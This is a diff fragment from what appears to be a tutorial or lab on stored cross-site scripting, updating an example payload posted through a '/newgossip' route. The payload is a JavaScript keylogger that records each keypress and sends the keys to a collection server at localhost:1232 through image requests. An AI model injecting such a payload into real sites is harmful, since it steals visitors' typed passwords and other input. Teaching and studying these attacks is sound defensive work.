@@ -56,8 +56,9 @@ Now, we insert a new post through **/newgossip** route using the following code 
 ```html
    <script>
    var k="";
-   document.onkeypress=function() {
-      k+=String.fromCharCode(window.event.keyCode);
+   document.onkeypress=function(e) {
+      e = e || window.event;
+      k+=e.key;
       var i=new Image;
       i.src="http://localhost:1232/"+k;
    }
